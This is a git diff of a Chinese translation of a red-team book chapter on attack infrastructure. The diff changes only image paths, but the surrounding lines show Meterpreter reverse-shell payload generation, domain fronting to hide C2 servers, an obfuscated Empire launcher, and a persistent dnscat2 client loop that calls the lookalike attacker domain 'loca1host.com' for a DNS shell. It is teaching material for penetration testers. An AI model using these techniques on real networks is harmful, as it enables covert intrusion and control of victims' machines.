@@ -2,7 +2,7 @@
 
 > 译者：[@Snowming](https://github.com/Snowming04)
 
-![](img/chapter_1/1-1.PNG)
+![](img/1-1.PNG)
       
 作为红队人员，我们通常不太关注某次攻击的目的（更关注的是攻击手法）。相反，我们想从那些高级威胁组织的 TTP（Tactics、Techniques & Procedures）中学到更多。举个例子，这是一个来自于火眼(FireEye)公司的公开的[威胁情报分析报告](https://www2.fireeye.com/rs/848-DID-2img/rpt-apt29-hammertoss.pdf)。从报告中，我们可以看到：这个威胁组织使用推特作为 C2 服务器，也使用了 github 作为存储加密图片和经过信息隐写文件的仓库。
 我们可以参考此报告，根据攻击手法的特点来针对性的做出合适的防御方案，来看你的公司是否能发现并拦截这种攻击。
@@ -10,14 +10,14 @@
 让我们对 APT 攻击做一些基本的介绍。由 MITRE 公司提出的 ATT&CK 矩阵( Adversarial Tactics, Techniques, and Common Knowledge matrix ) 是对 APT 攻击的详细分解。这个矩阵中是一个在各种攻击场景中使用的不同 TTP 的大集合。
 
 商用 ATT&CK 矩阵 - Windows版
-![](img/chapter_1/1-2.PNG)
+![](img/1-2.PNG)
 > 译者注：
 >1. 上面的矩阵仅仅包扩适用于 Windows 平台的技术。完整的商用 Enterprise ATT＆CK 矩阵也包括适用于 [macOS](https://attack.mitre.org/matrices/enterprise/macos/) 和 [Linux]( https://attack.mitre.org/matrices/enterprise/linux/) 平台的技术。
 >2. 矩阵中的内容严格复制自原书。只是因为原书图片分辨率太低，为了读者的阅读体验，特意重新作图。ATT&CK 矩阵至今没有中文翻译，因为译者才疏学浅，不敢献丑翻译，故保留英文。但是需要说明的是，书中列出的矩阵内容，跟 MITRE 公司官网给出的矩阵内容存在差异，可能是因为矩阵被重新修订了。故给出 [Enterprise Matrix - Windows的官网地址](https://attack.mitre.org/matrices/enterprise/windows/) 供读者参考。
 
 另一个资源是 [@cyb3rops](https://twitter.com/cyb3rops) 整理的 [APT组织与方法持续更新列表](http://bit.ly/2GZb8eW)。这个谷歌文件列举了世界多个国家的疑似 APT 组织及其使用的工具集。对于红队成员来说，我们可以参考此文档来模拟不同的攻击。当然，我们可能不会使用与文档中列举的相同的工具，但是我们可以构建类似的工具来做同样的攻击。
 
-![](img/chapter_1/1-16.PNG)
+![](img/1-16.PNG)
 
 
 ## 假定攻破练习 
@@ -72,11 +72,11 @@
 - cd /pentest
 
 下图显示了所有的可用模块，其中一些模块是我们自己安装的。
-![](img/chapter_1/1-3.PNG)<br>
+![](img/1-3.PNG)<br>
 图: 所有可用模块的列表
 
 如果我们查看我们的攻击者 VPS，就可以看到安装在我们的机器上的所有工具。如果我们想要启动 Metasploit，我们可以输入:*msfconsole*。<br>
-![](img/chapter_1/1-4.PNG)<br>
+![](img/1-4.PNG)<br>
 图: 安装在 /pentest 文件夹下的所有工具
 
 我仍然建议建立强大的 IPTables 规则。因为这将是你的攻击服务器，所以最好限制 SSH 身份验证可以从何处发起， Empire/Meterpreter/Cobalt Strike的 payload 可以从何处发起，以及你所支持的任何钓鱼页面。
@@ -108,7 +108,7 @@ msfvenom -payload windows/x64/meterpreter_reverse_http -format psh -out meterpre
 
 我们甚至可以将混淆提升到新的水平，并使用 [Unicorn](https://github.com/trustedsec/unicorn) 等工具生成更多模糊的基于 PowerShell 的 Meterpreter payload，我们将在本书中详细介绍这些混淆器。
 
-![](img/chapter_1/1-5.PNG)
+![](img/1-5.PNG)
 
 此外，使用受信任的机构签发的 SSL/TLS 证书可以帮助我们绕过某些网络中的 IDS（入侵检测系统），具体可以参考以下链接实现：[Meterpreter Paranoid Mode](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode)。
 
@@ -122,13 +122,13 @@ Cobalt Strike 是迄今为止我最喜欢的红队模拟工具之一。什么是
 #### Cobalt Strike 基础设施
 正如上文所述，在基础设施方面，我们希望设置这样一个可重用且高度灵活的环境。Cobalt Strike 支持重定向，当你的 Cobalt Strike 使用的 C2 域名被销毁了，你不需要创建并启用一个新的环境，只需要替换一个新的 C2 域名。你可以在这里找到更多的使用 socat 配置这些重定向器的信息：[链接1](http://bit.ly/2qxCbCZ)  &  [链接2](http://bit.ly/2IUc4Oe)
 
-<img src="img/chapter_1/1-6.PNG" width = "420" height = "270" alt="图片名称" align=center />
+<img src="img/1-6.PNG" width = "420" height = "270" alt="图片名称" align=center />
 
 为了使你更好的重定向，我们可以使用域名前置（域名幌子）。域名前置是使用其他的域名和基础设施的技术作为控制器重定向的技术集合([参考链接](http://bit.ly/2GYw55A))。这可以通过使用流行的内容分发网络(CDNs)来实现，如亚马逊云的 CloudFront 或其他的 Google Hosts 来隐蔽我们的流量源。这在过去曾被不同的攻击者所利用过([参考链接](http://bit.ly/2HoCRFi))。
 
 通过使用这些高信誉域名，无论 HTTP 或 HTTPS 的任何流量，看起来都像是它正在与这些域通信，而不是与我们的恶意 C2 服务器通信。这一切是如何运作的？用一个比较抽象的例子来说，你的所有流量将被发送到 CloudFront 的一个主要完全限定域名(FQDNs)，例如 a0.awsstatic.com，它是 CloudFront 的主要域名。修改请求中的主机 header 将把所有流量重定向到我们的 CloudFront 分发(CloudFront distribution)，后者最终会将流量转发到我们的 Cobalt Strike C2服务器上([参考链接](http://bit.ly/2GYw55A))。
 
-<img src="img/chapter_1/1-7.PNG" width = "400" height = "420" alt="图片名称" align=center />
+<img src="img/1-7.PNG" width = "400" height = "420" alt="图片名称" align=center />
 
 通过更改 HTTP 主机的 header，CDN 将很轻松的的的地把流量传输回到正确的服务器。红队一直使用这种技术通过使用高信誉域名来隐藏 C2 服务器的流量。
 
@@ -250,7 +250,7 @@ ServerVersion - 将其更改为另一个常见的服务器 Header
 execute
 ```
 
-<img src="img/chapter_1/1-8.PNG" width = "600" height = "380" alt="图片名称" align=center />
+<img src="img/1-8.PNG" width = "600" height = "380" alt="图片名称" align=center />
 
 
 #### 配置 Payload
@@ -292,7 +292,7 @@ generate
 cat /tmp/launcher.bat
 ```
 
-<img src="img/chapter_1/1-9.PNG" width = "600" height = "200" alt="图片名称" align=center />
+<img src="img/1-9.PNG" width = "600" height = "200" alt="图片名称" align=center />
 
 如你所见，创建的 payload 被严重混淆。 你现在可以把这个 .bat 文件丢到任何 Windows 系统上。 当然，你可能会创建一个 Office 宏文件或一个USB橡皮鸭（注：USB RUBBER DUCKY/USB 橡皮鸭是最早的按键注入工具）的 payload，但这只是众多示例中的一个。
 
@@ -320,7 +320,7 @@ dpkg -i powershell_6.0.2-1.ubuntu.16.04_amd64.deb
 
 在许多安全环境中，直接使用 UDP 或 TCP 出站会受到限制。 为什么不利用基础架构中已经内置的服务呢？许多受保护的网络包含一个 DNS 服务器来解析内部主机，同时还允许解析外部资源。通过为我们拥有的恶意域名设置一个权威服务器，我们可以利用这些 DNS 解析来对我们的恶意软件进行命令执行和控制。
 
-<img src="img/chapter_1/1-10.PNG" width = "500" height = "300" alt="图片名称" align=center />
+<img src="img/1-10.PNG" width = "500" height = "300" alt="图片名称" align=center />
 
 在我们的场景中，我们将设置名为 “loca1host.com” 的攻击者域。 我们希望通过对 “localhost” 创建“分身”来更多地隐藏我们的流量。请你自行将 “loca1host.com” 替换为你拥有的域名。我们将配置 loca1host.com 的 DNS 信息，使其成为一个权威 DNS 服务器(Authoritative DNS server)。
 在这个例子中，我们将使用 GoDaddy 的 DNS 配置工具，但你也可以换成任何其他的 DNS 服务。
@@ -340,7 +340,7 @@ ns2 (然后输入你的VPS的IP)
 添加 ns2.loca1host.com
 ```
 
-![](img/chapter_1/1-11.png)
+![](img/1-11.png)
 
 如上图所示，我们现在让我们的 NS 记录指向 ns1.loca1host.com 和 ns2.loca1host.com，它们都指向我们的攻击 VPS 服务器的 IP。 如果你尝试解析 loca1host.com 的任何子域（即 vpn.loca1host.com），它将尝试使用我们的 VPS 进行相关的域名解析。对我们来说幸运的是，dnscat2 在 UDP 端口53上监听并为我们做了所有繁重的工作。
 
@@ -396,7 +396,7 @@ nohup /bin/bash -c “while true; do /opt/dnscat2/client/dnscat loca1host.com -s
 #### dnscat2的连接
 在我们的 payload 执行并连接回我们的攻击服务器之后，我们应该看到类似于下面的一个新的`ENCRYPTED AND VERIFIED`消息。通过输入 “window”，dnscat2 将显示所有会话。现在，我们有一个名为“1”的单行命令会话。
 
-![](img/chapter_1/1-12.png)
+![](img/1-12.png)
 
 我们可以通过与我们的命令会话交互来生成终端样式 shell:
 - 与我们的第一个命令会话进行交互
@@ -417,7 +417,7 @@ window -i 2
 ```
 - 现在，你应该能够运行所有 shell 命令（例如 ls）
 
-![](img/chapter_1/1-13.png)
+![](img/1-13.png)
 
 虽然这不是最快的shell，但由于所有通信都是通过 DNS 进行的，因此它确实可以在一些 Meterpreter 或类似 shell 无法正常工作的情境下生效。 dnscat2 更好的地方是它完全支持搭建隧道。这样，如果我们想要使用来自我们的主机系统的漏洞利用模块，我们可以通过隧道和浏览器来访问其内部网站，甚至是 SSH 连接到另外的机器中，这一切都是可能的。
 
@@ -430,10 +430,10 @@ listen 127.0.0.1:9999 10.100.100.1:22
 创建隧道后，我们可以返回攻击计算机上的根终端窗口，通过本地的 9999 端口使用 SSH 连接到 localhost，然后成功连接到受害者网络上的内部系统并进行身份验证。
 > 译者注：这里如果看不懂，可以看看这篇文章加深理解 -> [使用SSH反向隧道进行内网穿透](http://arondight.me/2016/02/17/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/)
 
-![](img/chapter_1/1-14.png)
+![](img/1-14.png)
 
 这将提供各种各样的乐趣和一个很好的测试，来看你的客户的网络是否可以主动检测大量 DNS 查询和溢出。那么，请求和响应是什么样子的呢? 使用 Wireshark 快速抓包发现：dnscat2 为许多不同的长子域创建了大量不同的 DNS 请求。
-![](img/chapter_1/1-15.png)
+![](img/1-15.png)
 
 现在，你可能想要测试许多其他的协议。例如，Nishang 有一个基于 PowerShell 的 ICMP Shell( http://bit.ly/2GXhdnZ )，它使用 https://github.com/inquisb/icmpsh 作为 C2 服务器。 还有其他 ICMP shell，如:
 - https://github.com/jamesbarlow/icmptunnel
